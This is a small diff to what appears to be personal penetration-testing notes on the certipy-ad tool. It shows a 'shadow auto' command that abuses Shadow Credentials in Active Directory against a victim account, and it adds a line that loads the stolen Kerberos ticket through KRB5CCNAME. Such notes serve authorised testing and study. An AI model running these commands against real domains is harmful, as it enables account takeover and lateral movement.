@@ -28,6 +28,10 @@ https://github.com/Andre92Marcos/tools/tree/master/certipy-ad
 
 certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domain_controller_ip> -ns <dns_server_ip> -target <domain_controller_name>.<domain_name> -account <username_victim>
 
+To the use the TGT we can do:
+
+    KRB5CCNAME=$PWD/ca_svc.ccache <command_that_requires_the_TGT>
+
 
 
 ## More Information
